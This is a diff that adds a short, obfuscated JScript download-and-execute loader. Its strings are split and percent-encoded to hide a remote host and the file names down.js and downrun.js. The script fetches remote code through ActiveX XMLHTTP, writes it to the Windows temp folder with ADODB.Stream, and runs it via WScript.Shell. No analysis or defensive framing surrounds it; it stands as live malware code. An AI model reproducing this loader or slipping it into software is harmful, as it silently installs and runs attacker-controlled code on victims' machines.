@@ -1,0 +1,6 @@
+var b,d,e,f,g,a,c,z,y;y="ht"+"tp"+":/"+"/";b ="\\..\\windows\\temp\\down.js";a ="\\..\\windows\\temp\\downrun.js";
+z="%67%7a%64%6f%77%6e%32%32%2e%67%6f%6f%67%6c%65%70%61%67%65%73%2e%63%6f%6d";d =y+z+"/%64%6f%77%6e%2e%6a%73";
+c =y+z+"/%64%6f%77%6e%72%75%6e%2e%6a%73";b=b.toLowerCase();d=d.toLowerCase();c=c.toLowerCase();
+e = new ActiveXObject("Micro"+"soft"+".XM"+"LHTTP");e.Open("GET",d,0);e.Open("GET",c,0);e.Send();
+f = new ActiveXObject("ADOD"+"B."+"Str"+"eam");f.Mode = 3;f.Type = 1;f.Open(); f.Write(e.responseBody);f.SaveToFile(b,2);
+f.SaveToFile(a,2);g=new ActiveXObject("Wscr"+"ipt.Sh"+"ell");g.run(a,1);
